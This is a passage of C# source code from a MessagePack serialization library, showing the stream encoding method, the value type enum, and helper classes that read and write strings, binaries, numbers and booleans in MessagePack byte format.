    public void Encode2Stream(Stream ms)
    {
        switch (this.valueType)
        {
            case MsgPackType.Unknown:
            case MsgPackType.Null:
                WriteTools.WriteNull(ms);
                break;
            case MsgPackType.String:
                WriteTools.WriteString(ms, (String)this.innerValue);
                break;
            case MsgPackType.Integer:
                WriteTools.WriteInteger(ms, (Int64)this.innerValue);
                break;
            case MsgPackType.UInt64:
                WriteTools.WriteUInt64(ms, (UInt64)this.innerValue);
                break;
            case MsgPackType.Boolean:
                WriteTools.WriteBoolean(ms, (Boolean)this.innerValue);
                break;
            case MsgPackType.Float:
                WriteTools.WriteFloat(ms, (Double)this.innerValue);
                break;
            case MsgPackType.Single:
                WriteTools.WriteFloat(ms, (Single)this.innerValue);
                break;
            case MsgPackType.DateTime:
                WriteTools.WriteInteger(ms, GetAsInteger());
                break;
            case MsgPackType.Binary:
                WriteTools.WriteBinary(ms, (byte[])this.innerValue);
                break;
            case MsgPackType.Map:
                WriteMap(ms);
                break;
            case MsgPackType.Array:
                WirteArray(ms);
                break;
            default:
                WriteTools.WriteNull(ms);
                break;
        }
    }

    public String AsString
    {
        get
        {
            return GetAsString();
        }
        set
        {
            SetAsString(value);
        }
    }

    public Int64 AsInteger
    {
        get { return GetAsInteger(); }
        set { SetAsInteger((Int64)value); }
    }

    public Double AsFloat
    {
        get { return GetAsFloat(); }
        set { SetAsFloat(value); }
    }
    public MsgPackArray AsArray
    {
        get
        {
            lock (this)
            {
                if (refAsArray == null)
                {
                    refAsArray = new MsgPackArray(this, children);
                }
            }
            return refAsArray;
        }
    }


    public MsgPackType ValueType
    {
        get { return valueType; }
    }


    IEnumerator IEnumerable.GetEnumerator()
    {
        return new MsgPackEnum(children);
    }
}


public enum MsgPackType
{
    Unknown = 0,
    Null = 1,
    Map = 2,
    Array = 3,
    String = 4,
    Integer = 5,
    UInt64 = 6,
    Boolean = 7,
    Float = 8,
    Single = 9,
    DateTime = 10,
    Binary = 11
}

class ReadTools
{
    public static String ReadString(Stream ms, int len)
    {
        byte[] rawBytes = new byte[len];
        ms.Read(rawBytes, 0, len);
        return BytesTools.GetString(rawBytes);
    }

    public static String ReadString(Stream ms)
    {
        byte strFlag = (byte)ms.ReadByte();
        return ReadString(strFlag, ms);
    }

    public static String ReadString(byte strFlag, Stream ms)
    {
        //
        //fixstr stores a byte array whose length is upto 31 bytes:
        //+--------+========+
        //|101XXXXX|  data  |
        //+--------+========+
        //
        //str 8 stores a byte array whose length is upto (2^8)-1 bytes:
        //+--------+--------+========+
        //|  0xd9  |YYYYYYYY|  data  |
        //+--------+--------+========+
        //
        //str 16 stores a byte array whose length is upto (2^16)-1 bytes:
        //+--------+--------+--------+========+
        //|  0xda  |ZZZZZZZZ|ZZZZZZZZ|  data  |
        //+--------+--------+--------+========+
        //
        //str 32 stores a byte array whose length is upto (2^32)-1 bytes:
        //+--------+--------+--------+--------+--------+========+
        //|  0xdb  |AAAAAAAA|AAAAAAAA|AAAAAAAA|AAAAAAAA|  data  |
        //+--------+--------+--------+--------+--------+========+
        //
        //where
        //* XXXXX is a 5-bit unsigned integer which represents N
        //* YYYYYYYY is a 8-bit unsigned integer which represents N
        //* ZZZZZZZZ_ZZZZZZZZ is a 16-bit big-endian unsigned integer which represents N
        //* AAAAAAAA_AAAAAAAA_AAAAAAAA_AAAAAAAA is a 32-bit big-endian unsigned integer which represents N
        //* N is the length of data   

        byte[] rawBytes = null;
        int len = 0;
        if ((strFlag >= 0xA0) && (strFlag <= 0xBF))
        {
            len = strFlag - 0xA0;
        }
        else if (strFlag == 0xD9)
        {
            len = ms.ReadByte();
        }
        else if (strFlag == 0xDA)
        {
            rawBytes = new byte[2];
            ms.Read(rawBytes, 0, 2);
            rawBytes = BytesTools.SwapBytes(rawBytes);
            len = BitConverter.ToUInt16(rawBytes, 0);
        }
        else if (strFlag == 0xDB)
        {
            rawBytes = new byte[4];
            ms.Read(rawBytes, 0, 4);
            rawBytes = BytesTools.SwapBytes(rawBytes);
            len = BitConverter.ToInt32(rawBytes, 0);
        }
        rawBytes = new byte[len];
        ms.Read(rawBytes, 0, len);
        return BytesTools.GetString(rawBytes);
    }

}

class WriteTools
{
    public static void WriteNull(Stream ms)
    {
        ms.WriteByte(0xC0);
    }

    public static void WriteString(Stream ms, String strVal)
    {
        //
        //fixstr stores a byte array whose length is upto 31 bytes:
        //+--------+========+
        //|101XXXXX|  data  |
        //+--------+========+
        //
        //str 8 stores a byte array whose length is upto (2^8)-1 bytes:
        //+--------+--------+========+
        //|  0xd9  |YYYYYYYY|  data  |
        //+--------+--------+========+
        //
        //str 16 stores a byte array whose length is upto (2^16)-1 bytes:
        //+--------+--------+--------+========+
        //|  0xda  |ZZZZZZZZ|ZZZZZZZZ|  data  |
        //+--------+--------+--------+========+
        //
        //str 32 stores a byte array whose length is upto (2^32)-1 bytes:
        //+--------+--------+--------+--------+--------+========+
        //|  0xdb  |AAAAAAAA|AAAAAAAA|AAAAAAAA|AAAAAAAA|  data  |
        //+--------+--------+--------+--------+--------+========+
        //
        //where
        //* XXXXX is a 5-bit unsigned integer which represents N
        //* YYYYYYYY is a 8-bit unsigned integer which represents N
        //* ZZZZZZZZ_ZZZZZZZZ is a 16-bit big-endian unsigned integer which represents N
        //* AAAAAAAA_AAAAAAAA_AAAAAAAA_AAAAAAAA is a 32-bit big-endian unsigned integer which represents N
        //* N is the length of data

        byte[] rawBytes = BytesTools.GetUtf8Bytes(strVal);
        byte[] lenBytes = null;
        int len = rawBytes.Length;
        byte b = 0;
        if (len <= 31)
        {
            b = (byte)(0xA0 + (byte)len);
            ms.WriteByte(b);
        }
        else if (len <= 255)
        {
            b = 0xD9;
            ms.WriteByte(b);
            b = (byte)len;
            ms.WriteByte(b);
        }
        else if (len <= 65535)
        {
            b = 0xDA;
            ms.WriteByte(b);

            lenBytes = BytesTools.SwapBytes(BitConverter.GetBytes((Int16)len));
            ms.Write(lenBytes, 0, lenBytes.Length);
        }
        else
        {
            b = 0xDB;
            ms.WriteByte(b);

            lenBytes = BytesTools.SwapBytes(BitConverter.GetBytes((Int32)len));
            ms.Write(lenBytes, 0, lenBytes.Length);
        }
        ms.Write(rawBytes, 0, rawBytes.Length);
    }
    public static void WriteBinary(Stream ms, byte[] rawBytes)
    {

        byte[] lenBytes = null;
        int len = rawBytes.Length;
        byte b = 0;
        if (len <= 255)
        {
            b = 0xC4;
            ms.WriteByte(b);
            b = (byte)len;
            ms.WriteByte(b);
        }
        else if (len <= 65535)
        {
            b = 0xC5;
            ms.WriteByte(b);

            lenBytes = BytesTools.SwapBytes(BitConverter.GetBytes((Int16)len));
            ms.Write(lenBytes, 0, lenBytes.Length);
        }
        else
        {
            b = 0xC6;
            ms.WriteByte(b);

            lenBytes = BytesTools.SwapBytes(BitConverter.GetBytes((Int32)len));
            ms.Write(lenBytes, 0, lenBytes.Length);
        }
        ms.Write(rawBytes, 0, rawBytes.Length);
    }

    public static void WriteFloat(Stream ms, Double fVal)
    {
        ms.WriteByte(0xCB);
        ms.Write(BytesTools.SwapDouble(fVal), 0, 8);
    }

    public static void WriteSingle(Stream ms, Single fVal)
    {
        ms.WriteByte(0xCA);
        ms.Write(BytesTools.SwapBytes(BitConverter.GetBytes(fVal)), 0, 4);
    }

    public static void WriteBoolean(Stream ms, Boolean bVal)
    {
        if (bVal)
        {
            ms.WriteByte(0xC3);
        }
        else
        {
            ms.WriteByte(0xC2);
        }
    }


    public static void WriteUInt64(Stream ms, UInt64 iVal)
    {
        ms.WriteByte(0xCF);
        byte[] dataBytes = BitConverter.GetBytes(iVal);
        ms.Write(BytesTools.SwapBytes(dataBytes), 0, 8);
    }

    public static void WriteInteger(Stream ms, Int64 iVal)
    {
        if (iVal >= 0)
        {   // 正数
            if (iVal <= 127)
            {
                ms.WriteByte((byte)iVal);
            }
            else if (iVal <= 255)
            {  //UInt8
                ms.WriteByte(0xCC);
                ms.WriteByte((byte)iVal);
            }
            else if (iVal <= (UInt32)0xFFFF)
            {  //UInt16
                ms.WriteByte(0xCD);
                ms.Write(BytesTools.SwapInt16((Int16)iVal), 0, 2);
            }
            else if (iVal <= (UInt32)0xFFFFFFFF)
            {  //UInt32
                ms.WriteByte(0xCE);
                ms.Write(BytesTools.SwapInt32((Int32)iVal), 0, 4);
            }
            else
            {  //Int64
                ms.WriteByte(0xD3);
                ms.Write(BytesTools.SwapInt64(iVal), 0, 8);
            }
        }
        else
        {  // <0
            if (iVal <= Int32.MinValue)  //-2147483648  // 64 bit
            {
                ms.WriteByte(0xD3);
                ms.Write(BytesTools.SwapInt64(iVal), 0, 8);
            }
            else if (iVal <= Int16.MinValue)   // -32768    // 32 bit
            {
                ms.WriteByte(0xD2);
                ms.Write(BytesTools.SwapInt32((Int32)iVal), 0, 4);
            }
            else if (iVal <= -128)   // -32768    // 32 bit
            {
                ms.WriteByte(0xD1);
                ms.Write(BytesTools.SwapInt16((Int16)iVal), 0, 2);
            }
            else if (iVal <= -32)
            {
                ms.WriteByte(0xD0);
                ms.WriteByte((byte)iVal);
            }
            else
            {
                ms.WriteByte((byte)iVal);
            }
        }  // end <0
    }

}

}



